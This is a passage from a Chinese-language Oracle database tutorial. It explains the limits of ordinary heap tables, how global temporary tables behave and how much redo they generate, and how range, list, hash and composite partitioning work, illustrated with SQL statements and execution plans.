的日志。\n无论是删除、插入还是修改，都会产生日志。前面体系结构中讲过这些日志是用于数据库的备份和恢复的。如果仅从性能角度而不从安全性角度来考虑，更新表写日志就意味着数据库多做了额外的事情而影响了效率，虽说安全第一，不过在某些特定的场合，某些表的记录只是作为中间结果临时运算而根本无须永久保留，这些表无须写日志，那就既高效又安全了！这就是后续会说的全局临时表。\nDelete无法释放空间使用 delete from t 删除表，前后查询所产生的逻辑读次数是相同的。只有使用 truncate table t 清空表，才能显著减少逻辑读次数。显然，delete删除并不能释放空间，虽然delete将很多块的记录删除了，但是空块依然保留，Oracle在查询时依然会去查询这些空块。而truncate是一种释放高水平位的动作，这些空块被回收，空间也就释放了。\n不过truncate显然不能替代delete，因为truncate是一种DDL操作而非DML操作，truncate后面是不能带条件的，truncate table t where…是不允许的。但是如果表中这些where条件能形成有效的分区，Oracle是支持在分区表中做truncate分区的，命令大致为 alter table t truncate partition &#39;分区名&#39;。如果where条件就是分区条件，那等同于换角度实现了truncate table t where…的功能。这就是分区表最实用的功能之一了，高效地清理数据，释放空间。\n此外，当大量delete删除再大量insert插入时，Oracle会去这些delete的空块中首先完成插入（直接路径插入除外），所以频繁delete又频繁insert的应用，是不会出现空块过多的情况的。\n表记录太大检索较慢一张表其实就是一个SEGMENT，一般情况下我们都需要遍历该SEGMENT的所有BLOCK来完成对该表进行更新查询等操作，在这种情况下，表越大，更新查询操作就越慢。有没有什么好方法能提升检索的速度呢？主要思路就是缩短访问路径来完成同样的更新查询操作，简单地说就是完成同样的需求访问BLOCK的个数越少越好。Oracle为了尽可能减少访问路径提供了两种主要技术，一种是索引技术，另一种则是分区技术。\n以 select * from t where insert_time &gt; xxxx and insert_time &lt; xxxx 为例，如果id是主键，那么Oracle会直接通过索引找到对应的BLOCK，然后直接读取该BLOCK中的记录。\n首先说索引，这是Oracle中最重要也是最实用的技术之一。在本例中，如果 insert_time &gt; xxxx and insert_time &lt; xxxx 返回的记录非常少，或者说T表的总记录相比非常少，则在 insert_time 列建索引能极大提升该语句的效率。比如建了一个 t_id_index 的索引，在该SQL查询时首先会访问 t_id_index 这个新建出来的索引段，然后通过索引段和表段的映射关系，迅速从表中获取行列的信息并返回结果。具体细节后续索引部分细说。索引本身也是一把双刃剑，既能给数据库开发应用带来极大的帮助，也会给数据库带来不小的灾难。\n减少访问路径的第二种技术就是分区技术，把普通表T表改造为分区表，比如以 insert_time 这个时间列为分区字段，比如从 2020年1月到2023年12月按月建36个分区。早先的T表就一个T段，现在情况变化了，从1个大段分解成了36个小段，分别存储了2010年1月到2012年12月的信息，此时假如 insert_time &gt; xxxx and insert_time &lt; xxxx 这个时间跨度正好是落在2020年11月，那Oracle的检索就只要完成一个小段的遍历即可。假设这36个小段比较均匀，我们就可以大致理解为访问量只有原来的三十六分之一，大幅度减少了访问路径，从而高效地提升了性能。\n索引回表读开销很大观察下面例子中，TABLE ACCESS BY INDEX ROWID BATCHED 的开销。\nL&gt; drop table t purge;Table dropped.SQL&gt; create table t as select * from dba_objects where ROWNUM &lt;= 200;Table created.SQL&gt; create index t_object_id_index on t(object_id);Index created.SQL&gt; set linesize 1000SQL&gt; set autotrace traceonlySQL&gt; select * from t where object_id &lt;= 10;9 rows selected.Execution Plan----------------------------------------------------------Plan hash value: 632031452---------------------------------------------------------------------------------------------------------| Id  | Operation                           | Name              | Rows  | Bytes | Cost (%CPU)| Time     |---------------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT                    |                   |     9 |   963 |     2   (0)| 00:00:01 ||   1 |  TABLE ACCESS BY INDEX ROWID BATCHED| T                 |     9 |   963 |     2   (0)| 00:00:01 ||*  2 |   INDEX RANGE SCAN                  | T_OBJECT_ID_INDEX |     9 |       |     1   (0)| 00:00:01 |---------------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   2 - access(&quot;OBJECT_ID&quot;&lt;=10)Statistics----------------------------------------------------------       1316  recursive calls          0  db block gets       1620  consistent gets        135  physical reads          0  redo size       4319  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client         96  sorts (memory)          0  sorts (disk)          9  rows processed\n\n一般来说，根据索引来检索记录，会有一个先从索引中找到记录，再根据索引列上的 ROWID 定位到表中从而返回索引列以外的其他列的动作，这就是TABLE ACCESS BY INDEX ROWID。下面观察如果消除 TABLE ACCESS BY INDEX ROWID BATCHED 的开销。\nSQL&gt; select object_id from t where object_id &lt;= 10;9 rows selected.Execution Plan----------------------------------------------------------Plan hash value: 3023054428--------------------------------------------------------------------------------------| Id  | Operation        | Name              | Rows  | Bytes | Cost (%CPU)| Time     |--------------------------------------------------------------------------------------|   0 | SELECT STATEMENT |                   |     9 |    36 |     1   (0)| 00:00:01 ||*  1 |  INDEX RANGE SCAN| T_OBJECT_ID_INDEX |     9 |    36 |     1   (0)| 00:00:01 |--------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - access(&quot;OBJECT_ID&quot;&lt;=10)Statistics----------------------------------------------------------       1262  recursive calls          0  db block gets       1484  consistent gets        151  physical reads          0  redo size        697  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client         96  sorts (memory)          0  sorts (disk)          9  rows processed\n\n这里没有 TABLE ACCESS BY INDEX ROWID 了。因为语句从 select * from t where object_id &lt;= 10; 改写为 select object_id from t where object_id &lt;= 10; 了，不用从索引中回到表中获取索引列以外的其他列了。性能上，逻辑读从1620变为1484，代价从2变为1。（每次执行前都清空了共享池和缓存）避免回表从而使性能提升这是一个很简单的道理，少做事性能当然提升了。只是 select * from t 和 select object_id from t毕竞不等价，有没有什么方法可以实现写法依然是 select * from t 但是还是可以不回表呢？普通表是做不到的，能实现这种功能的只有索引组织表。\n有序插入却难以有序读出在对普通表的操作中，我们无法保证在有序插入的前提下就能有序读出。最简单的一个理由就是，如果把行记录插入块中，然后删除了该行，接下来插入的行会去填补块中的空余部分，这就无法保证有序了。所以在查询数据时，如果想有序地展现，就必须使用order by，否则根本不能保证顺序展现，而order by操作是开销很大的操作。\nSQL&gt; select object_id from t;200 rows selected.Execution Plan----------------------------------------------------------Plan hash value: 1601196873--------------------------------------------------------------------------| Id  | Operation         | Name | Rows  | Bytes | Cost (%CPU)| Time     |--------------------------------------------------------------------------|   0 | SELECT STATEMENT  |      |   200 |   800 |     3   (0)| 00:00:01 ||   1 |  TABLE ACCESS FULL| T    |   200 |   800 |     3   (0)| 00:00:01 |--------------------------------------------------------------------------Statistics----------------------------------------------------------          1  recursive calls          0  db block gets         20  consistent gets          4  physical reads          0  redo size       4228  bytes sent via SQL*Net to client        433  bytes received via SQL*Net from client         15  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)        200  rows processedSQL&gt; select object_id from t order by OBJECT_ID desc;200 rows selected.Execution Plan----------------------------------------------------------Plan hash value: 961378228---------------------------------------------------------------------------| Id  | Operation          | Name | Rows  | Bytes | Cost (%CPU)| Time     |---------------------------------------------------------------------------|   0 | SELECT STATEMENT   |      |   200 |   800 |     4  (25)| 00:00:01 ||   1 |  SORT ORDER BY     |      |   200 |   800 |     4  (25)| 00:00:01 ||   2 |   TABLE ACCESS FULL| T    |   200 |   800 |     3   (0)| 00:00:01 |---------------------------------------------------------------------------Statistics----------------------------------------------------------         50  recursive calls          6  db block gets         46  consistent gets          1  physical reads       1008  redo size       4228  bytes sent via SQL*Net to client        433  bytes received via SQL*Net from client         15  SQL*Net roundtrips to/from client          3  sorts (memory)          0  sorts (disk)        200  rows processed\n\n可以观察到，有排序的操作的统计信息模块有个 3 sorts(memory)，表示发生了排序，执行计划中也有SORT ORDER BY的关键字。不过最重要的是，没排序的操作代价为3，有排序的操作代价为4，性能上是有差异的，在大数量时将会非常明显。关于order by避免排序的方法有两种思路。第一种思路是在order by的排序列建索引，至于为什么，还是留着后续索引部分细说。第二种方法就是，将普通表改造为有序散列聚簇表，这样可以保证顺序插入，order by展现时无须再有排序动作。\n奇特的全局临时表从数据安全性来看，对表记录的操作写日志是不可避免的，否则备份恢复就无从谈起了，只是现实中真的有一部分应用对表的某些操作是不需要恢复的，比如运算过程中临时处理的中间结果集，这时就可以考虑用全局临时表来实现。\n全局临时表的类型全局临时表分为两种类型，一种是基于会话的全局临时表(commit preserve rows)，一种是基于事务的全局临时表(on commit delete rows)。\n-- 创建基于会话的全局临时表drop table t_tmp_session purge;create global temporary table T_TMP_session on commit preserve rows as select * from dba_objects where 1 = 2;select table_name, temporary, duration from user_tables where table_name = &#x27;T_TMP_SESSION&#x27;;-- 创建基于事务的全局临时表drop table t_tmp_transaction purge;create global temporary table t_tmp_transaction on commit delete rows as select * from dba_objects where 1 = 2;select table_name, temporary, DURATION from user_tables where table_name = &#x27;T_TMP_TRANSACTION&#x27;;\n\n观察各类DML的REDO日志量SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                             43504SQL&gt; insert into T_TMP_session select * from dba_objects;71208 rows created.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                            605748-- 基于会话的全局临时表，插入数据时产生了 605748 - 43504 = 562244 ，约0.54MBSQL&gt; insert into t_tmp_transaction select * from dba_objects;71208 rows created.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                           1167932-- 基于事务的全局临时表，插入数据时产生了 1167932 - 605748 = 562184 ，约0.54MBSQL&gt; update T_TMP_session set object_id = rownum;71208 rows updated.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                           6850608-- 基于会话的全局临时表，更新数据时产生了 6850608 - 1167932 = 5682676 ，约5.42MBSQL&gt; update t_tmp_transaction set object_id = rownum;71208 rows updated.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                          11516184-- 基于事务的全局临时表，更新数据时产生了 11516184 - 6850608 = 4665576 ，约4.45MBSQL&gt; delete from T_TMP_session;71208 rows deleted.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                          23298188-- 基于会话的全局临时表，删除数据时产生了 23298188 - 11516184 = 11782004 ，约11.24MBSQL&gt; delete from t_tmp_transaction;71208 rows deleted.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                          35080104-- 基于事务的全局临时表，删除数据时产生了 35080104 - 23298188 = 11781916 ，约11.24MB\n\n可以发现全局临时表，无论插入，修改还是删除，都还是要写日志。只是无论插入更新还是删除，操作普通表产生的日志都比全局临时表要多。具体比较就省略了，比较语句上基本没有差别。\n全局临时表两大特性全局临时表最重要的特点有两个。\n\n高效删除记录，基于事务的全局临时表COMMIT或者SESSION连接退出后，临时表记录自动删除；基于会话的全局临时表则是SESSION连接退出后，临时表记录自动删除，都无须手动去操作。\n针对不同会话数据独立，不同的SESSION访问全局临时表，看到的结果不同。\n\n高效删除记录基于事务的全局临时表COMMIT后，记录会被删除。另外，用C0MMT方式删除全局临时表记录所产生的日志量才很小，比起直接用delete方式操作产生的日志量，几乎可以忽略不计了。这点日志其实还是是COMMIT动作本身产生的，所以基本可以理解为全局临时表的COMMIT或者退出SESSION的方式不会产生日志。\nSQL&gt; insert into t_tmp_transaction select * from dba_objects;71208 rows created.SQL&gt; select count(1) from t_tmp_transaction;  COUNT(1)----------     71208SQL&gt; commit;Commit complete.SQL&gt; select count(1) from t_tmp_transaction;  COUNT(1)----------         0\n\n基于会话的全局临时表SESSION退出后，记录会被删除。\n一般来说，基于SESSION的全局临时表的应用会更多一些，少数比较复杂的应用，涉及一次调用中需要记录清空再插入等复杂动作时，才考虑用基于事务的全局临时表。\n不同会话独立即每个session会话中查询到的全局临时表数据是相互独立的，相互隔离、互不干扰。\n-- 查询当前会话信息select * from v$mystat where ROWNUM = 1;\n\n神通广大的分区表在如今数据量日益增长的海量数据库时代，分区表技术显得尤为重要，甚至可以说使用得当与否将决定到系统的生死。关于普通堆表的不足，其中表记录太大检索慢和delete删除有瑕疵这两个缺点正好可以被分区表的分区消除和可以高效清理分区数据这两大特点给弥补了。\n什么叫分区消除，最通俗的比喻就是，对某表按月份建了范围分区，从1月到12月共12个分区，你查询当前12月的记录，就不会去访问另外11个区，少做事了，这就是分区消除。高效分区清理呢，就是如果要删除某分区的数据，如果直接delete，速度很慢，而且高水平位也不会释放，查询的块依然很多，这时可以直接truncate这个分区，速度非常快。\n在这个Google的时代，语法和知识点都不是问题，搜不到的是体系，是重点，是思想。上面是书中的原话，这里还想说的就是。时代在进步，如今AI的时代，获取知识更加容易。但无论什么时代，都要善于利用工具。\n分区表类型及原理首先探讨的是分区表的类型及原理。分区表的类型有范围分区、列表分区、HA$H分区及组合分区4种。其中范围分区应用最为广泛，需要重点学习和掌握，而列表分区次之，在某些场合下也可以考虑使用组合分区，相对而言HASH分区在应用中适用的场景并不广泛，使用的频率比较低。\noracle分区表的使用和查询\n范围分区范围分区最常见的是按时间列进行分区。\n-- 创建范围分区表create table range_part_tab(    id        number,    deal_date date,    area_code number,    contents  varchar2(4000))    partition by range (deal_date)(    partition p1 values less than (TO_DATE(&#x27;2024-02-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p2 values less than (TO_DATE(&#x27;2024-03-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p3 values less than (TO_DATE(&#x27;2024-04-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p4 values less than (TO_DATE(&#x27;2024-05-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p5 values less than (TO_DATE(&#x27;2024-06-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p6 values less than (TO_DATE(&#x27;2024-07-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p7 values less than (TO_DATE(&#x27;2024-08-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p8 values less than (TO_DATE(&#x27;2024-09-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p9 values less than (TO_DATE(&#x27;2024-10-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p10 values less than (TO_DATE(&#x27;2024-11-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p11 values less than (TO_DATE(&#x27;2024-12-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p12 values less than (TO_DATE(&#x27;2025-01-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p_max values less than (maxvalue))-- 插入一整年随机日期和591-599之间的随机数。共100000条数据insert into range_part_tab(id, deal_date, area_code, contents)select rownum,       to_date(to_char(sysdate - 365, &#x27;J&#x27;) + TRUNC(DBMS_RANDOM.VALUE(0, 365)), &#x27;J&#x27;),       ceil(dbms_random.value(590, 599)),       rpad(&#x27;*&#x27;, 400, &#x27;*&#x27;)from dualconnect by rownum &lt;= 100000;\n\n\n范围分区的关键字为 partition by range ，即这三个关键字表示该分区为范围分区。后面为范围的字段。\nvalues less than 是范围分区特定的语法，用于指明具体的范围，比如partition p3 values less than (TO_DATE(&#39;2024-04-01&#39;, &#39;YYYY-MM-DD&#39;))，表示小于3月份的记录。partition p1到partition pmax 表示总共建立了13个分区。最后还要注意partition p_max values less than (maxvalue)的部分，表示超出这些范围的记录全部落在这个分区中，包括空值，免得出错。\n分区表的分区可分别指定在不同的表空间里，如果不写即为都在同一默认表空间里。如果将每个分区保存到单独的表空间中，这样数据文件就可以跨越多个物理磁盘。\n\n列表分区列表分区的特点是某列的值只有几个，基于这样的特点我们可以采用列表分区。创建一个按字段数据列表固定可枚举值分区的表。插入记录分区字段的值必须在列表中，否则不能被插入。\n-- 创建列表分区表create table list_part_tab(    id        number,    deal_date date,    area_code number,    contents  varchar2(4000))    partition by list (area_code)(    partition p_591 values (591),    partition p_592 values (592),    partition p_593 values (593),    partition p_594 values (594),    partition p_595 values (595),    partition p_596 values (596),    partition p_597 values (597),    partition p_598 values (598),    partition p_599 values (599),    partition p_other values (DEFAULT))\n\n\n列表分区的关键字为partition by list，即这三个关键字表示该分区为列表分区。\n不同于之前范围分区的values less than，列表分区仅需values即可确定范围，值得注意的是，partition p592 values(592)并不是说明取值只能写一个，也可写为多个，比如partition p_union values (592,593,594)。\npartition p_591到partition p_other表示总共建立了10个分区。\npartition p_other values(default)，表示不在刚才591到S99范围的记录全部落在这个默认分区中，包括空值，避免应用出错。\n分区表的分区可分别指定在不同的表空间里，如果不写即为都在同一默认表空间里。\n\n散列分区（Hash分区）hash分区最主要的机制是根据hash算法来计算具体某条纪录应该插入到哪个分区中，hash算法中最重要的是hash函数，Oracle中如果你要使用hash分区，只需指定分区的数量即可。建议分区的数量采用2的n次方，这样可以使得各个分区间数据分布更加均匀。\n-- 创建hash分区表create table hash_part_tab(    id        number,    deal_date date,    area_code number,    contents  varchar2(4000))    partition by hash (deal_date)    PARTITIONS 16;\n\n\n散列分区的关键字为partition by hash，出现这三个关键字即表示当前分区为散列分区。\n散列分区与之前两种分区的明显差别在于：没有指定分区名，而仅仅是指定了分区个数，如PARTITIONS 16。\n散列分区的分区数量采用2的n次方，这样可以使得各个分区间数据分布更加均匀。\n可以指定散列分区的分区表空间，比如增加如下一小段，STORE IN(ts1,ts2,ts3,ts4,ts5,ts6,ts7,ts8,ts9,ts10,ts11,ts12,ts13,ts14,ts15,ts16)表示分别存在在12个不同的表空间里，当然不写出表空间就是都在同一默认表空间里。\n\n组合分区组合分区结合了两种或多种不同的分区方法，如范围分区（Range Partitioning）、列表分区（List Partitioning）和散列分区（Hash Partitioning）。通过组合使用这些方法，可以实现更高效的查询性能和更好的数据管理。\n基于范围分区和列表分区，表首先按某列进行范围分区，然后再按某列进行列表分区，分区之中的分区被称为子分区。基于范围分区和散列分区，表首先按某列进行范围分区，然后再按某列进行散列分区。以此类推，其实就是分区中的分区。\n-- 创建基于范围和列表的组合分区表CREATE TABLE range_list_part_tab(    id        number,    deal_date date,    area_code number,    contents  varchar2(4000))    partition by range (deal_date) -- 第一级分区：按年份范围分区    SUBPARTITION by list (area_code) -- 第二级分区：按地区编号列表分区(    PARTITION rlp1 VALUES LESS THAN (TO_DATE(&#x27;2024-06-01&#x27;, &#x27;YYYY-MM-DD&#x27;))        (        subpartition rlp1_595 values (595),        subpartition rlp1_other values (DEFAULT)        ),    partition rlp2 values less than (maxvalue)        (        subpartition rlp2_595 values (595),        subpartition rlp2_other values (DEFAULT)        ))-- 简化CREATE TABLE range_list_part_tab(  id        number,  deal_date date,  area_code number,  contents  varchar2(4000))  partition by range (deal_date) -- 第一级分区：按年份范围分区  SUBPARTITION by list (area_code) -- 第二级分区：按地区编号列表分区  subpartition template(  subpartition p_591 values (591),  subpartition p_592 values (592),  subpartition p_593 values (593),  subpartition p_594 values (594),  subpartition p_595 values (595),  subpartition p_596 values (596),  subpartition p_597 values (597),  subpartition p_598 values (598),  subpartition p_599 values (599),  subpartition p_other values (DEFAULT))(  partition p1 values less than (TO_DATE(&#x27;2024-02-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p2 values less than (TO_DATE(&#x27;2024-03-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p3 values less than (TO_DATE(&#x27;2024-04-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p4 values less than (TO_DATE(&#x27;2024-05-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p5 values less than (TO_DATE(&#x27;2024-06-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p6 values less than (TO_DATE(&#x27;2024-07-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p7 values less than (TO_DATE(&#x27;2024-08-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p8 values less than (TO_DATE(&#x27;2024-09-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p9 values less than (TO_DATE(&#x27;2024-10-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p10 values less than (TO_DATE(&#x27;2024-11-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p11 values less than (TO_DATE(&#x27;2024-12-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p12 values less than (TO_DATE(&#x27;2025-01-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p_max values less than (maxvalue));\n\n\n组合分区是由主分区和从分区组成的，比如范围列表分区，就表示主分区是范围分区，而从分区是列表分区，从分区的关键字为subpartition,比如本例中的subpartition by list (area_code)。\n为了避免在每个主分区中都写相同的从分区，可以考虑用模版方式，比如简化中的subpartition TEMPLATE关键字。\n只要涉及子分区模块，都需要有subpartition关键字。\n关于表空间和之前的没有差别，依然是可以指定，也可以不指定。\n\n分区原理-- 创建普通表作为对照create table norm_tab(id number,deal_date date,area_code number,contents varchar2(4000));insert into norm_tab(id, deal_date, area_code, contents)select rownum,       to_date(to_char(sysdate - 365, &#x27;J&#x27;) + TRUNC(DBMS_RANDOM.VALUE(0, 365)), &#x27;J&#x27;),       ceil(dbms_random.value(590, 599)),       rpad(&#x27;*&#x27;, 400, &#x27;*&#x27;)from dualconnect by rownum &lt; 100000;\n\n比较普通表与分区表在段分配上的差异\nSQL&gt; set linesize 1000SQL&gt; set pagesize 5000SQL&gt; column segment_name format a20SQL&gt; column partition_name format a20SQL&gt; column segment_type format a20SQL&gt; select segment_name,partition_name,segment_type,bytes/1024/1024,tablespace_name from user_segments where segment_name IN(&#x27;RANGE_PART_TAB&#x27;,&#x27;NORM_TAB&#x27;);SEGMENT_NAME         PARTITION_NAME       SEGMENT_TYPE         BYTES/1024/1024 TABLESPACE_NAME-------------------- -------------------- -------------------- --------------- ------------------------------RANGE_PART_TAB       P1                   TABLE PARTITION                   23 SYSTEMRANGE_PART_TAB       P4                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P3                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P7                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P6                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P2                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P5                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P8                   TABLE PARTITION                .1875 SYSTEMNORM_TAB                                  TABLE                             46 SYSTEM9 rows selected.\n\n分区表会产生多个SEGMENT，而且是建了几个分区就有几个SEGMENT，而普通表仅有一个SEGMENT。分区表一个很简单的思想：化整为零，将大对象切割成多个小对象，从而使得在指定的小对象中定位到数据成为一种可能，最终达到减少访问路径，尽量少做事就能解决问题的目的。\nHASH分区表无法让指定的数据到指定的分区去，这对快速检索数据并不是很有利，因此HASH分区在实际的工作中应用得相对较少一些。不过任何事情存在即合理，HASH分区会用在什么场合呢？其实HASH分区最大的好处在于，将数据根据一定HASH算法，均匀分布到不同的分区中去，避免查询数据时集中在某一个地方，从而避免热点块的竞争，改善IO。此外，HASH可以精确匹配，无法范围扫描。现实中我们可以针对某些本身就无法有效执行分区范围的列进行HASH分区，比如ID列之类的，在出现热点块竞争严重时，可考虑如此设计。\n组合分区的分区数量比起非组合分区会多很多。比如上面创建的range_list_part_tab表，有130个分区。组合分区存在的意义，就是化整为零思想的升级版，将一个大对象切割得更细更小了。这对于一个超级大表来说，也是有一定的意义的。不过分区表也是有额外开销的，如果分区数量过多，Oracle就需要管理过多的段，在操作分区表时也容易引发Oracle内部大量的递归调用，此外本身的语法也有一定的复杂度。所以一般来说，只有大表才建议建分区，记录数在100万以下的表，基本上不建议建分区。\n分区表最实用的特性高效的分区清除分区表存在最大的意义就在于，可以有效地做到分区消除，比如你对地区号做了分区，查询福州就只会在福州的分区中查找数据，而不会到厦门、漳州、泉州等其他分区中查找，这就是分区消除，消除了福州以外的所有其他分区。原理很简单，就是因为分区表其实是将一个大对象分成了多个小对象，通过分区的规则，可以确定数据在哪个或哪几个小对象中，从而减少访问路径。\n比较相同语句，普通表无法用到 DEAL_DATE 条件进行分区消除的情况。\nSQL&gt; select * from range_part_tab where deal_date &gt;= TO_DATE(&#x27;2024-02-04&#x27;, &#x27;YYYY-MM-DD&#x27;) and deal_date &lt; TO_DATE(&#x27;2024-02-07&#x27;, &#x27;YYYY-MM-DD&#x27;);853 rows selected.Elapsed: 00:00:00.16Execution Plan----------------------------------------------------------Plan hash value: 16125146---------------------------------------------------------------------------------------------------------| Id  | Operation              | Name           | Rows  | Bytes | Cost (%CPU)| Time     | Pstart| Pstop |---------------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT       |                |   832 |  1655K|   129   (0)| 00:00:01 |       |       ||   1 |  PARTITION RANGE SINGLE|                |   832 |  1655K|   129   (0)| 00:00:01 |     2 |     2 ||*  2 |   TABLE ACCESS FULL    | RANGE_PART_TAB |   832 |  1655K|   129   (0)| 00:00:01 |     2 |     2 |---------------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   2 - filter(&quot;DEAL_DATE&quot;&gt;=TO_DATE(&#x27; 2024-02-04 00:00:00&#x27;, &#x27;syyyy-mm-dd hh24:mi:ss&#x27;) AND              &quot;DEAL_DATE&quot;&lt;TO_DATE(&#x27; 2024-02-07 00:00:00&#x27;, &#x27;syyyy-mm-dd hh24:mi:ss&#x27;))Note-----   - dynamic statistics used: dynamic sampling (level=2)Statistics----------------------------------------------------------         50  recursive calls          3  db block gets        652  consistent gets          0  physical reads        620  redo size      29086  bytes sent via SQL*Net to client       1508  bytes received via SQL*Net from client         58  SQL*Net roundtrips to/from client          2  sorts (memory)          0  sorts (disk)        853  rows processedSQL&gt; select * from norm_tab where deal_date &gt;= TO_DATE(&#x27;2024-02-04&#x27;, &#x27;YYYY-MM-DD&#x27;) and deal_date &lt; TO_DATE(&#x27;2024-02-07&#x27;, &#x27;YYYY-MM-DD&#x27;);800 rows selected.Elapsed: 00:00:00.21Execution Plan----------------------------------------------------------Plan hash value: 278673677------------------------------------------------------------------------------| Id  | Operation         | Name     | Rows  | Bytes | Cost (%CPU)| Time     |------------------------------------------------------------------------------|   0 | SELECT STATEMENT  |          |  1494 |  2971K|  1596   (1)| 00:00:01 ||*  1 |  TABLE ACCESS FULL| NORM_TAB |  1494 |  2971K|  1596   (1)| 00:00:01 |------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - filter(&quot;DEAL_DATE&quot;&gt;=TO_DATE(&#x27; 2024-02-04 00:00:00&#x27;, &#x27;syyyy-mm-dd              hh24:mi:ss&#x27;) AND &quot;DEAL_DATE&quot;&lt;TO_DATE(&#x27; 2024-02-07 00:00:00&#x27;,              &#x27;syyyy-mm-dd hh24:mi:ss&#x27;))Note-----   - dynamic statistics used: dynamic sampling (level=2)Statistics----------------------------------------------------------         24  recursive calls         27  db block gets       6019  consistent gets          0  physical reads       4456  redo size      27437  bytes sent via SQL*Net to client       1433  bytes received via SQL*Net from client         55  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)        800  rows processed\n\n同样的语句，相似记录的表，分区表的代价仅为129，逻辑读只有652，而普通表代价为1596，逻辑读为6019。差别如此之大，和分区表查询只遍历了13个分区中的一个有关。在分区表查询的执行计划中看到p_start和p_stop都标记上2，表示只遍历了第2个分区。这样避开了对其余12个分区的查询。\n下面来看组合分区相同语句的执行计划。\nSQL&gt; select * from range_list_part_tab where deal_date &gt;= TO_DATE(&#x27;2024-02-04&#x27;, &#x27;YYYY-MM-DD&#x27;) and deal_date &lt; TO_DATE(&#x27;2024-02-07&#x27;, &#x27;YYYY-MM-DD&#x27;);864 rows selected.Elapsed: 00:00:00.30Execution Plan----------------------------------------------------------Plan hash value: 3813662781--------------------------------------------------------------------------------------------------------------| Id  | Operation              | Name                | Rows  | Bytes | Cost (%CPU)| Time     | Pstart| Pstop |--------------------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT       |                     |   692 |  1376K|   135   (2)| 00:00:01 |       |       ||   1 |  PARTITION RANGE SINGLE|                     |   692 |  1376K|   135   (2)| 00:00:01 |     2 |     2 ||   2 |   PARTITION LIST ALL   |                     |   692 |  1376K|   135   (2)| 00:00:01 |     1 |    10 ||*  3 |    TABLE ACCESS FULL   | RANGE_LIST_PART_TAB |   692 |  1376K|   135   (2)| 00:00:01 |    11 |    20 |--------------------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   3 - filter(&quot;DEAL_DATE&quot;&gt;=TO_DATE(&#x27; 2024-02-04 00:00:00&#x27;, &#x27;syyyy-mm-dd hh24:mi:ss&#x27;) AND              &quot;DEAL_DATE&quot;&lt;TO_DATE(&#x27; 2024-02-07 00:00:00&#x27;, &#x27;syyyy-mm-dd hh24:mi:ss&#x27;))Note-----   - dynamic statistics used: dynamic sampling (level=2)Statistics----------------------------------------------------------         10  recursive calls          3  db block gets        803  consistent gets          0  physical reads        620  redo size      26324  bytes sent via SQL*Net to client       1533  bytes received via SQL*Net from client         59  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)        864  rows processed\n\n组合分区的代价为135，比范围分区稍高。按理说组合分区的粒度更细，代价应该更低才对，为什么呢？是因为分区数过多，调用有开销。但由于这里表总记录不过10万，全表扫描开销都不是太大，这时Oracle内部调用的开销影响就相对较大。如果表是一张超级大表，比如有上亿，那这些开销相比而言就可以忽略不计了。所以分区表应用在大表会更合适。\n强大的分区操作分区 truncatedelete无法释放空间，而truncate却有效地释放了空间。但可惜的是，针对普通表而言，truncate往往不能轻易使用，因为delete往往是针对某些条件的局部记录删除，而truncate显然不能带上条件，无法做到局部删除。这时分区表就发挥作用了，Oracle可以实现只truncate某个分区，这就等同于实现了局部删除。\nalter table range_part_tab truncate partition p9; 